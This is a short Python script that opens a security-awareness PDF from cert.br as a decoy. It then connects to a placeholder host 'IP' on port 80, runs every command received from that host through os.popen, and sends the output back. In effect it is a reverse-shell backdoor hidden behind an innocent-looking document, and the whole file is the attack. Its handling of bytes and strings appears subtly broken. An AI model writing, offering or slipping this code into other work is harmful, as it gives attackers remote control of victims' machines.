import os,socket

os.popen('explorer https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf')

ip = "IP"
porta = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,porta))

while True:
    cmd = s.recv(1024)
    for comando in os.popen(cmd):
        s.send(comando)